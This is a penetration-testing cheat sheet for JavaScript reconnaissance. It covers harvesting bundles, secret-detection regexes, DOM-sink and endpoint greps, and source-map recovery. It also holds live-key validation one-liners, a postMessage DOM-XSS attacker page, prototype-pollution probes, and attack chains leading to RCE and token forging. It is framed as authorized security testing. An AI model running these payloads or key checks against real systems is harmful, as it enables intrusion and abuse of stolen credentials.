# JS-Files Arsenal — Secret Regexes, Extractors, Sink Greps & Source-Map Recovery (copy-paste)

> Companion to `JS_FILES_TESTING_GUIDE.md`. Authorized testing only. The win condition is never "a match" — it's a
> **live + privileged secret**, a **firing DOM XSS**, or a **working unauthorized API call** (Guide §10/§12/§14).

---

## 1. Harvest every JS (current + historical + chunks)
*What & when:* step one, before any analysis — grab every copy of the blueprint, not just the front one. The **historical** (gau/waybackurls) lines are the gold: old bundles keep rotated-but-still-live keys and endpoints removed from the UI that still work. Miss a file, miss the bug.

```bash
T=target.com
# crawl live
katana -u https://$T -d 3 -jc -kf all -silent | grep -Ei '\.js(\?|$)' | anew js_urls.txt
hakrawler -url https://$T -d 3 2>/dev/null | grep -Ei '\.js(\?|$)' | anew js_urls.txt
# historical (gold — rotated-but-live keys, removed endpoints)
echo $T | gau --subs        | grep -Ei '\.js(\?|$)' | anew js_urls.txt
echo $T | waybackurls       | grep -Ei '\.js(\?|$)' | anew js_urls.txt
# download corpus
mkdir -p out/js
while read u; do
  f="out/js/$(echo "$u" | md5sum | cut -c1-12)_$(basename "${u%%\?*}")"
  curl -s -L --max-time 20 -A 'Mozilla/5.0' "$u" -o "$f"
done < js_urls.txt
# inline scripts from HTML pages too:
# curl -s https://$T | grep -oP '(?s)<script>.*?</script>' >> out/js/_inline.js
```

---

## 1b. Deobfuscate, walk bundle internals & dynamic analysis (Guide §4)
```bash
# beautify + deobfuscate (recover names/strings/control-flow)
npx js-beautify -r out/js/*.js
npx webcrack out/js/main.js -o unpacked/        # webpack + obfuscator.io string-array + control-flow
# (alts) de4js (web UI), npx synchrony deobfuscate file.js, REstringer
# AST-aware search (beats regex for sinks/calls):
ast-grep --pattern 'fetch($URL)' out/js   ;   ast-grep --pattern '$X.innerHTML = $Y' out/js

# walk the WEBPACK CHUNK MANIFEST → download EVERY chunk (incl. admin/internal the UI never loads)
#  1) find the manifest map  {id:"hash"}  in the runtime/main chunk:
grep -RhoE '\{[0-9]+:"[0-9a-f]+"' out/js | head
#  2) the loader builds URLs like  /static/js/<id>.<hash>.js  — reconstruct & fetch all ids.
#  Vite: pull build manifest if exposed:  curl -s https://target/manifest.json | jq .
```
```
# Dynamic analysis (fastest for env/config + DOM-XSS):
DevTools → Sources (auto-loads .map) · Coverage (what ran) · Network (real API + auth headers) · Search-all-files
Burp DOM Invader → auto source→sink DOM-XSS + vulnerable postMessage handlers (Guide §8/§12)
CSP check: 'require-trusted-types-for script' present? → naive innerHTML sinks throw (need a TT-policy bypass)
```
```bash
# Mobile JS bundles (endpoints/keys not in the web app) — pull from APK/IPA, then mine like any JS:
#   React Native: assets/index.android.bundle | main.jsbundle      Cordova/Ionic: www/**/*.js
# Dependency confusion: list internal scoped packages referenced in the bundle / package.json:
grep -RhoE '@[a-z0-9_-]+/[a-z0-9._-]+' out/js | sort -u    # an internal @target/* not on npmjs.com → publishable → supply-chain RCE
# Service worker & embedded specs:
curl -s https://target/sw.js | grep -oE 'https?://[^"'"'"' )]+'  # precache list = more URLs
grep -RhoE '"openapi"|"swagger"|__schema|IntrospectionQuery' out/js   # inlined API spec / GraphQL schema (§6/§14)
```

## 2. Secret regexes (HIGH-VALUE — validate live, Guide §10/§11)
*What & when:* run these over the whole corpus to surface *candidates* — then treat every hit as unproven until §6 validates it live. The HIGH block is worth chasing (keys that open real locks off-site); the LOW block is the "lobby wifi password" that gets reports closed. Never lead with a LOW match.

```
AWS access key id     AKIA[0-9A-Z]{16}
AWS temp key id       ASIA[0-9A-Z]{16}
AWS secret            (?i)aws(.{0,20})?(secret|sk)(.{0,20})?['"][0-9a-zA-Z/+]{40}['"]
Private key block     -----BEGIN (RSA|EC|OPENSSH|DSA|PGP|PRIVATE) (PRIVATE )?KEY-----
GCP service acct      "type":\s*"service_account"        | "private_key":\s*"-----BEGIN
Azure storage         AccountKey=[0-9A-Za-z+/=]{40,}      | SharedAccessSignature
GitHub PAT (classic)  ghp_[0-9A-Za-z]{36}
GitHub PAT (fine)     github_pat_[0-9A-Za-z_]{82}
GitHub app/oauth      gh[ous]_[0-9A-Za-z]{36}
GitLab PAT            glpat-[0-9A-Za-z_-]{20}
Slack token           xox[baprs]-[0-9A-Za-z-]{10,}
Stripe SECRET         sk_live_[0-9a-zA-Z]{24,}
Twilio                AC[0-9a-f]{32}.{0,40}?[0-9a-f]{32}
SendGrid              SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}
Mailgun               key-[0-9a-zA-Z]{32}
JWT (inspect!)        eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}
DB URI w/ creds       (mongodb(\+srv)?|postgres(ql)?|mysql|redis|amqp)://[^:@\s]+:[^@\s]+@[^/\s]+
Generic secret-ish    (?i)(api[_-]?key|secret|passwd|password|token|auth)['"]?\s*[:=]\s*['"][0-9a-zA-Z\-_=]{16,}['"]
Internal host/IP      (?i)(internal|intranet|corp|vpn|admin)[.-][a-z0-9.-]+ | \b10\.\d+\.\d+\.\d+\b
```

LOW-VALUE (usually Info — Guide §17, do NOT lead with these):
```
Google API key        AIza[0-9A-Za-z_-]{35}        (Maps/Firebase web — domain-restricted, public by design)
Stripe PUBLISHABLE    pk_live_[0-9a-zA-Z]{24,}      (meant to be public)
Sentry DSN            https://[0-9a-f]{32}@[a-z0-9.]+/[0-9]+
reCAPTCHA site key / GA / Segment write key
```

Run the scanner (entropy-gated):
```bash
python3 poc/secret_scan.py -d out/js -o secrets.txt
trufflehog filesystem out/js --only-verified         # auto-validates many key types
gitleaks detect --no-git -s out/js -r gitleaks.json
```

---

## 3. Endpoint / route / parameter extraction (Guide §6/§7)

```bash
# paths, full URLs, query params
grep -RhoE "(https?:)?//[a-zA-Z0-9_.~%-]+(/[a-zA-Z0-9_.~%/?=&-]*)?" out/js | sort -u > urls.txt
grep -RhoE "/(api|v[0-9]+|internal|admin|graphql|rest)/[a-zA-Z0-9_./{}:-]+" out/js | sort -u > api_paths.txt
grep -RhoE "[?&][a-zA-Z0-9_]+=" out/js | tr -d '?&=' | sort -u > params.txt
# GraphQL operations
grep -RhoE "(query|mutation)\s+[A-Za-z0-9_]+" out/js | sort -u > graphql_ops.txt

# LinkFinder / xnLinkFinder (smarter)
python3 LinkFinder/linkfinder.py -i 'https://target.com/static/js/*.js' -o cli
python3 xnLinkFinder/xnLinkFinder.py -i out/js -sf target.com -o endpoints.txt
python3 poc/endpoints.py -d out/js -o endpoints.txt
```

Hidden-surface greps:
```bash
grep -RnE "role\s*===?\s*['\"]admin['\"]|isAdmin|hasPermission|can\(|featureFlag|FLAGS?\[" out/js
grep -RnE "/(admin|internal|debug|impersonate|sudo|superuser)" out/js
grep -RnE "(debug|test|internal|bypass|isAdmin|impersonate)\s*[:=]\s*(true|1)" out/js
```

---

## 4. DOM sink discovery (Guide §8/§12)
*What & when:* use these to trace the pipe from a **source** you control to a dangerous **sink** — a bug that lives entirely in the JS, no server needed. Grep for the sinks and sources, then confirm one actually connects and fires (DOM Invader). The no-origin-check `postMessage` handler is the highest-value pattern here.

```bash
# sinks
grep -RnE "\.innerHTML|\.outerHTML|document\.write(ln)?|insertAdjacentHTML|createContextualFragment|\
\beval\(|new Function\(|setTimeout\(['\"]|setInterval\(['\"]|dangerouslySetInnerHTML|\$\(.*\)\.html\(" out/js
# sources
grep -RnE "location\.(hash|search|href|pathname)|document\.(URL|referrer|cookie)|window\.name|\
URLSearchParams|postMessage|addEventListener\(['\"]message" out/js
# redirect sinks (open redirect → OAuth token theft)
grep -RnE "location\s*=|location\.(href|assign|replace)\s*\(|window\.open\(" out/js
# prototype pollution sinks
grep -RnE "merge|extend|defaultsDeep|cloneDeep|setWith|__proto__|constructor\[|deparam|qs\.parse" out/js

python3 poc/dom_sinks.py -d out/js -o sinks.txt    # ranks source→sink proximity
```

postMessage DOM-XSS attacker page:
```html
<iframe src="https://target.com/page-with-handler" id="f"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>
```

Prototype-pollution probes:
```
?__proto__[test]=polluted            #__proto__[test]=polluted
?constructor[prototype][test]=polluted
JSON body: {"__proto__":{"polluted":"yes"}}     (into a recursive merge)
confirm in console:  ({}).test === 'polluted'   ||  ({}).polluted === 'yes'
```

---

## 5. Source-map recovery (Guide §9)
*What & when:* the highest-leverage single move — turn the label-scrubbed bundle back into the developers' original labelled source. Always try `<bundle>.js.map` even when nothing references it (often deployed by accident). Then re-run every extractor against the recovered code — far higher signal than the minified version.

```bash
# find the map reference
grep -RhoE "sourceMappingURL=[^ '\"]+" out/js
# fetch + unpack (even if not referenced, TRY <bundle>.js.map)
curl -s https://target.com/static/js/main.abc123.js.map -o main.map
python3 poc/sourcemap_unpack.py -u https://target.com/static/js/main.abc123.js.map -o out/src
# or
python3 unwebpack-sourcemap/unwebpack_sourcemap.py https://target.com/static/js/main.abc123.js.map out/src
# then re-mine the ORIGINAL source (higher signal)
grep -RiE "(password|secret|token|api[_-]?key|internal|admin|TODO|FIXME|HACK|//)" out/src | head -100
```

---

## 6. Live-secret validation one-liners (read-only — Guide §10)
*What & when:* the step that converts a candidate into a finding — each is the key's own "who am I?" call that proves it's live and shows its scope, without touching real data. Run the matching one for every HIGH hit, screenshot the identity response, then STOP.

```bash
aws sts get-caller-identity                                          # AWS (set the env keys first)
curl -s -H "Authorization: token ghp_…" https://api.github.com/user  # GitHub PAT + scopes
curl -s -H "PRIVATE-TOKEN: glpat-…" https://gitlab.com/api/v4/user    # GitLab
curl -s https://api.stripe.com/v1/balance -u sk_live_…:              # Stripe SECRET (200 = live)
curl -s -d token=xoxb-… https://slack.com/api/auth.test              # Slack
curl -s -H "Authorization: Bearer SG.…" https://api.sendgrid.com/v3/scopes
# GCP service-account JSON:
gcloud auth activate-service-account --key-file sa.json && gcloud auth print-access-token | cut -c1-12
```
> Prove live + scope with the minimal call, then STOP. Don't enumerate/read real data.

---

## 6b. More HIGH-value secret patterns (validate live — guide §10)
```
Google OAuth refresh    1/[0-9A-Za-z_-]{43,64}        Google service-acct     "private_key_id" + "client_email"
Heroku API key          [hH]eroku.{0,20}[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}
Square / PayPal/Braintree  sq0atp-[0-9A-Za-z_-]{22} / sq0csp-... ; access_token$production$...
Shopify                 shpat_[0-9a-fA-F]{32}  shpss_  shppa_  shpca_
Stripe restricted       rk_live_[0-9a-zA-Z]{24,}
Twilio auth token       (?i)twilio.{0,20}SK[0-9a-f]{32}
DigitalOcean            dop_v1_[0-9a-f]{64}
Datadog / NewRelic / PagerDuty / Algolia admin keys
Firebase DB secret + open RTDB URL   https://<proj>.firebaseio.com/.json   (test unauth read/write!)
Mapbox sk.            npm token  npm_[0-9A-Za-z]{36}     PyPI token  pypi-AgEIcHlwaS5vcmc...
Telegram bot token    [0-9]{8,10}:[A-Za-z0-9_-]{35}     Discord bot/webhook
Generic bearer/basic  (?i)(authorization|x-api-key)\s*[:=]\s*['"]?(bearer\s+|basic\s+)?[A-Za-z0-9._\-]{20,}
JWT in bundle         eyJ...  → inspect alg/claims/SECRET reuse (JWT kit)
```

## 6c. Endpoint / hidden-surface & proto-pollution greps (guide §6/§7/§13)
```bash
# GraphQL / websocket / internal hosts
grep -RhoE "(query|mutation|subscription)\s+[A-Za-z0-9_]+|wss?://[a-zA-Z0-9_.:-]+|(internal|corp|admin)[.-][a-z0-9.-]+" out/js
# mass-assignment / hidden params / feature flags / client-side authz
grep -RnE "isAdmin|is_staff|role\s*[:=]|featureFlag|FLAGS?\[|can\(|hasPermission|impersonate|debug\s*[:=]\s*true" out/js
# prototype-pollution sinks (then test gadget → DOM-XSS/RCE, JS-files guide §13)
grep -RnE "Object.assign|merge\(|defaultsDeep|cloneDeep|setWith|__proto__|constructor\[|extend\(\s*true|qs\.parse|deparam" out/js
```

## 7b. Real-world JS-recon chains & references (guide §11-§15)
```
□ Live cloud key in bundle → assume role → cloud run-command → RCE (validate read-only sts get-caller-identity).
□ Hardcoded server/admin API key (sk_live_/shpat_/Algolia admin) → privileged API actions / data dump.
□ CI/VCS token (ghp_/glpat_/npm_) → poison pipeline/package → SUPPLY-CHAIN RCE.
□ Firebase RTDB URL open → unauth read/write of the whole DB (very common, high impact).
□ Source map (.map) deployed to prod → full original source → re-mine for secrets/endpoints (guide §9).
□ postMessage handler w/o origin check (DOM-sink scan §4) → cross-origin DOM XSS → ATO (guide §12).
□ Client-side-only authz (isAdmin in JS) → call the admin API directly → privilege escalation (guide §7/§14).
□ Hidden /api/admin & internal endpoints → IDOR/BOLA/authz (guide §14).
□ JWT secret / weak alg found → forge tokens (JWT kit). Internal hostnames → SSRF target list (SSRF kit).
```
> **References:** PortSwigger (DOM-based XSS, Prototype pollution), PayloadsAllTheThings (Prototype Pollution, secrets),
> HackTricks (PostMessage, Prototype pollution, secret hunting), `GerbenJavado/LinkFinder`, `xnl-h4ck3r/xnLinkFinder`,
> `trufflesecurity/trufflehog`, `gitleaks`, `rarecoil/unwebpack-sourcemap`, SecLists, Hackviser & PentesterLab modules.

---

## 7. Triage rules (don't waste a report)

```
server/cloud/CI/signing/DB secret + VALIDATED live + privileged   → REPORT (High/Critical; RCE chain → Critical §11)
public client key (AIza/pk_live/Sentry DSN)                        → Info — do NOT lead with it (§17)
DOM sink + controllable source + FIRES                            → REPORT DOM XSS (High; ATO §12)
proto-pollution sink + working gadget                             → REPORT (High client / Critical server §13)
hidden endpoint + server doesn't enforce authz (you called it)    → REPORT IDOR/authz (Medium–High §14)
endpoint list / unvalidated match / unreachable sink              → recon/Info — validate & exploit first
source map exposed (no sensitive content)                         → Low/Info — chase what it reveals
```
